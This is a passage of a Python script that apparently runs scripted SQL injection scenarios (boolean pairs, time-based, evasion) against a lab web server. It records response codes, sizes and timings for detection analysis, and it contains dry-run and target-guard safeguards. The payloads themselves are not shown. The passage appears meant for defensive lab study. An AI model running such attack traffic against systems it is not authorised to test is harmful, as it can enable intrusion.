            f"{escape_md_cell(params_for_display(request_spec.params))} | "
            f"{str(request_spec.is_optional).lower()} | "
            f"{escape_md_cell(request_spec.expected_interpretation)} | "
            f"{escape_md_cell(request_spec.interpretation_limit)} |"
        )
    lines.extend(
        [
            "",
            "## Interpretation Guardrails",
            "",
            "- This runner does not confirm SQLi success, DB data exfiltration, or auth bypass success.",
            "- status_code=200, response_body_bytes, and runner duration_ms alone must not be treated as SQLi success evidence.",
            "- Time-based SQLi must be interpreted with Apache duration_us / ttfb_us rather than runner duration_ms.",
            "- Response body raw content is never stored or inspected.",
        ]
    )
    return "\n".join(lines) + "\n"


def build_boolean_pair_rows(results: list[dict[str, Any]]) -> list[tuple[str, str, int | None, int | None, int | None]]:
    by_scenario = {item["scenario_id"]: item for item in results if item["scenario_id"] in {
        "B-R2A-01",
        "B-R2A-02",
        "B-R2A-03",
        "B-R2A-04",
        "B-R2A-05",
        "B-R2A-06",
    }}
    pairs = [
        ("B-R2A-01", "B-R2A-02"),
        ("B-R2A-03", "B-R2A-04"),
        ("B-R2A-05", "B-R2A-06"),
    ]
    rows = []
    for true_id, false_id in pairs:
        if true_id not in by_scenario or false_id not in by_scenario:
            continue
        true_bytes = by_scenario[true_id].get("response_body_bytes")
        false_bytes = by_scenario[false_id].get("response_body_bytes")
        delta = None
        if isinstance(true_bytes, int) and isinstance(false_bytes, int):
            delta = true_bytes - false_bytes
        rows.append((true_id, false_id, true_bytes, false_bytes, delta))
    return rows


def build_run_summary_markdown(
    metadata: dict[str, Any],
    requests: list[RequestSpec],
    results: list[dict[str, Any]],
) -> str:
    status_counts: dict[str, int] = {}
    errors: list[str] = []
    body_lengths = [
        item["response_body_bytes"]
        for item in results
        if isinstance(item.get("response_body_bytes"), int)
    ]
    scenario_totals: dict[str, dict[str, int]] = {}

    for item in results:
        status_key = str(item["status_code"]) if item["status_code"] is not None else "none"
        status_counts[status_key] = status_counts.get(status_key, 0) + 1
        scenario_bucket = scenario_totals.setdefault(
            item["scenario_id"],
            {"count": 0, "error_count": 0},
        )
        scenario_bucket["count"] += 1
        if item.get("error"):
            scenario_bucket["error_count"] += 1
            errors.append(f"- {item['request_label']}: {item['error']}")

    selected_ids = []
    for request_spec in requests:
        if request_spec.scenario_id not in selected_ids:
            selected_ids.append(request_spec.scenario_id)

    boolean_rows = build_boolean_pair_rows(results)
    includes_time_track = any(
        request_spec.scenario_id in TIME_TRACK_SCENARIO_IDS for request_spec in requests
    )

    if body_lengths:
        body_summary = f"min={min(body_lengths)}, max={max(body_lengths)}"
    else:
        body_summary = "min=n/a, max=n/a"

    lines = [
        "# B Set R2 SQLi Run Summary",
        "",
        f"- mode: {metadata['mode']}",
        f"- base_url: {metadata['base_url']}",
        f"- scenario: {metadata['scenario']}",
        f"- generated_at: {metadata['generated_at']}",
        f"- started_at: {metadata['started_at']}",
        f"- ended_at: {metadata['ended_at']}",
        f"- request_count: {metadata['request_count']}",
        f"- sleep_scale: {metadata['sleep_scale']}",
        f"- timeout_sec: {metadata['timeout_sec']}",
        f"- target_class: {metadata['target_class']}",
        "- transport: urllib.request over http/https",
        "- 이 runner는 SQLi 성공, DB 유출, 인증 우회 성공을 검증하지 않는다.",
        "",
        "## Status Code Distribution",
        "",
    ]
    if status_counts:
        for status_key in sorted(status_counts):
            lines.append(f"- {status_key}: {status_counts[status_key]}")
    else:
        lines.append("- none")

    lines.extend(
        [
            "",
            "## Scenario Results",
            "",
        ]
    )
    for scenario_id in selected_ids:
        bucket = scenario_totals.get(scenario_id, {"count": 0, "error_count": 0})
        lines.append(
            f"- {scenario_id}: requests={bucket['count']} errors={bucket['error_count']}"
        )

    lines.extend(
        [
            "",
            "## Error Summary",
            "",
        ]
    )
    lines.extend(errors or ["- none"])

    lines.extend(
        [
            "",
            "## Response Body Bytes",
            "",
            f"- {body_summary}",
        ]
    )

    if boolean_rows:
        lines.extend(
            [
                "",
                "## Boolean Pair Byte Comparison",
                "",
                "| TRUE ID | FALSE ID | TRUE bytes | FALSE bytes | delta |",
                "|---|---|---|---|---|",
            ]
        )
        for true_id, false_id, true_bytes, false_bytes, delta in boolean_rows:
            lines.append(
                f"| {true_id} | {false_id} | {true_bytes} | {false_bytes} | {delta} |"
            )

    if includes_time_track:
        time_durations = [
            item["duration_ms"]
            for item in results
            if item["scenario_id"] in TIME_TRACK_SCENARIO_IDS and isinstance(item.get("duration_ms"), (int, float))
        ]
        if time_durations:
            median_duration = round(statistics.median(time_durations), 2)
        else:
            median_duration = "n/a"
        lines.extend(
            [
                "",
                "## Time Track Note",
                "",
                f"- runner_duration_ms_median_reference: {median_duration}",
                "- runner duration_ms is only a rough client-side reference value.",
                "- time-based interpretation must use Apache duration_us / ttfb_us as the primary evidence.",
            ]
        )

    lines.extend(
        [
            "",
            "## Interpretation Guardrails",
            "",
            "- No SQLi success confirmation.",
            "- No DB data exfiltration confirmation.",
            "- No auth bypass confirmation from status_code=200 alone.",
            "- No time-based success confirmation without Apache duration_us / ttfb_us delta.",
            "- Response body raw content not inspected or stored.",
        ]
    )
    return "\n".join(lines) + "\n"


def discard_response_body(response: Any) -> int:
    total = 0
    while True:
        chunk = response.read(READ_CHUNK_SIZE)
        if not chunk:
            return total
        total += len(chunk)


def execute_request(
    base_url: str,
    request_spec: RequestSpec,
    ua_prefix: str,
    timeout_sec: float,
) -> dict[str, Any]:
    started_at = now_local_iso()
    started_perf = time.perf_counter()
    user_agent = user_agent_for(
        ua_prefix,
        request_spec.scenario_id,
        request_spec.request_label,
    )
    url = build_full_url(base_url, request_spec.path, request_spec.params)
    urllib_request = urllib.request.Request(
        url=url,
        method=request_spec.method,
        headers={"User-Agent": user_agent},
        data=None,
    )

    status_code = None
    response_body_bytes = None
    error_message = None

    try:
        with urllib.request.urlopen(urllib_request, timeout=timeout_sec) as response:
            status_code = response.getcode()
            response_body_bytes = discard_response_body(response)
    except urllib.error.HTTPError as error:
        status_code = error.code
        try:
            response_body_bytes = discard_response_body(error)
        except Exception:
            response_body_bytes = None
    except urllib.error.URLError as error:
        error_message = f"URLError: {error}"
    except Exception as error:  # pragma: no cover
        error_message = f"{error.__class__.__name__}: {error}"

    ended_at = now_local_iso()
    duration_ms = round((time.perf_counter() - started_perf) * 1000, 2)
    return {
        "scenario_id": request_spec.scenario_id,
        "scenario_label": request_spec.scenario_label,
        "request_label": request_spec.request_label,
        "method": request_spec.method,
        "path": request_spec.path,
        "params": params_as_objects(request_spec.params),
        "user_agent": user_agent,
        "expected_observation": request_spec.expected_observation,
        "expected_interpretation": request_spec.expected_interpretation,
        "expected_response": request_spec.expected_response,
        "interpretation_limit": request_spec.interpretation_limit,
        "is_optional": request_spec.is_optional,
        "started_at": started_at,
        "ended_at": ended_at,
        "status_code": status_code,
        "response_body_bytes": response_body_bytes,
        "duration_ms": duration_ms,
        "error": error_message,
    }


def maybe_sleep(seconds: float) -> None:
    if seconds > 0:
        time.sleep(seconds)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Run B-set Round 2 SQLi lab scenarios. Use only in approved local lab environments."
        ),
        epilog=(
            "This runner does not confirm SQLi success, DB exfiltration, or auth bypass. "
            "--dry-run and --print-plan never send HTTP requests."
        ),
    )
    parser.add_argument("--base-url", required=True, help="Target base URL")
    parser.add_argument("--out", required=True, help="Output directory for plan/log files")
    parser.add_argument(
        "--scenario",
        default="core",
        help=(
            "Scenario selector: all, core, boolean, time, evasion, chain, fp, "
            "r2a, r2b, or comma-separated IDs"
        ),
    )
    parser.add_argument(
        "--ua-prefix",
        default="lab-b-set",
        help="User-Agent prefix for generated requests",
    )
    parser.add_argument("--dry-run", action="store_true", help="Print and write plan only")
    parser.add_argument("--print-plan", action="store_true", help="Alias of --dry-run")
    parser.add_argument(
        "--sleep-scale",
        type=float,
        default=DEFAULT_SLEEP_SCALE,
        help="Scale inter-request sleep durations",
    )
    parser.add_argument(
        "--timeout-sec",
        type=float,
        default=DEFAULT_TIMEOUT_SEC,
        help="Per-request timeout in seconds",
    )
    parser.add_argument(
        "--allow-public-target",
        action="store_true",
        help="Explicitly allow execution against a public/general target",
    )
    parser.add_argument(
        "--include-optional",
        action="store_true",
        help="Include optional legacy/high-load scenarios in allowed selections",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    dry_run = args.dry_run or args.print_plan
    if args.sleep_scale < 0:
        raise SystemExit("--sleep-scale must be >= 0")
    if args.timeout_sec <= 0:
        raise SystemExit("--timeout-sec must be > 0")
    if not args.ua_prefix.strip():
        raise SystemExit("--ua-prefix must not be empty")

    base_url = normalize_base_url(args.base_url)
    target_class = enforce_target_guard(
        base_url=base_url,
        dry_run=dry_run,
        allow_public_target=args.allow_public_target,
    )
    requests = build_request_plan(args.scenario, args.include_optional)

    output_dir = Path(args.out)
    output_dir.mkdir(parents=True, exist_ok=True)

    started_at = now_local_iso()
    generated_at = started_at
    mode = "dry-run" if dry_run else "execute"
    print(f"[b-r2] mode={mode} scenario={args.scenario}")
    print(f"[b-r2] request_count={len(requests)} target_class={target_class}")

    metadata = {
        "runner": RUNNER_NAME,
        "version": RUNNER_VERSION,
        "base_url": base_url,
        "scenario": args.scenario,
        "mode": mode,
        "generated_at": generated_at,
        "started_at": started_at,
        "ended_at": None,
        "request_count": len(requests),
        "sleep_scale": args.sleep_scale,
        "timeout_sec": args.timeout_sec,
        "target_class": target_class,
        "args": {
            "base_url": args.base_url,
            "out": args.out,
            "scenario": args.scenario,
            "ua_prefix": args.ua_prefix,
            "dry_run": args.dry_run,
            "print_plan": args.print_plan,
            "sleep_scale": args.sleep_scale,
            "timeout_sec": args.timeout_sec,
            "allow_public_target": args.allow_public_target,
            "include_optional": args.include_optional,
        },
    }

    plan_payload = {
        "metadata": {
            "runner": RUNNER_NAME,
            "version": RUNNER_VERSION,
            "base_url": base_url,
            "scenario": args.scenario,
            "mode": mode,
            "generated_at": generated_at,
            "ua_prefix": args.ua_prefix,
            "request_count": len(requests),
            "target_class": target_class,
        },
        "requests": [
            render_request(request_spec, base_url, args.ua_prefix, args.sleep_scale)
            for request_spec in requests
        ],
    }

    write_json(output_dir / OUTPUT_PLAN_JSON, plan_payload)
    write_text(
        output_dir / OUTPUT_PLAN_MD,
        build_plan_markdown(
            base_url=base_url,
            scenario=args.scenario,
            ua_prefix=args.ua_prefix,
            sleep_scale=args.sleep_scale,
            timeout_sec=args.timeout_sec,
            requests=requests,
            dry_run=dry_run,
            target_class=target_class,
            include_optional=args.include_optional,
        ),
    )

    if dry_run:
        metadata["ended_at"] = now_local_iso()
        write_json(output_dir / OUTPUT_METADATA_JSON, metadata)
        print("[b-r2] dry-run complete; no HTTP requests sent")
        return 0

    results_path = output_dir / OUTPUT_RESULTS_JSONL
    write_text(results_path, "")
    results: list[dict[str, Any]] = []
    for request_spec in requests:
        result = execute_request(base_url, request_spec, args.ua_prefix, args.timeout_sec)
        append_jsonl(results_path, result)
        results.append(result)
        maybe_sleep((request_spec.sleep_after_sec or 0.0) * args.sleep_scale)

    metadata["ended_at"] = now_local_iso()
    write_json(output_dir / OUTPUT_METADATA_JSON, metadata)
    write_text(
        output_dir / OUTPUT_SUMMARY_MD,
        build_run_summary_markdown(metadata, requests, results),
    )
    print(f"[b-r2] execution complete; results={len(results)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
